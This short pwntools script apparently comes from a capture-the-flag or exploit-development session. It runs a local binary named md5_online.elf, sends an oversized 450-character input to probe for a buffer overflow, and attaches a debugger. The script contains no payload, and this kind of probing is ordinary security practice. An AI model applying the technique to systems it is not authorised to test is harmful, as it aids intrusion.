from pwn import *
io=process("./md5_online.elf")
io.recvuntil("Text: ")
io.send("a"*450)
io.sendline("a"*011)
gdb.attach(io)
io.interactive()
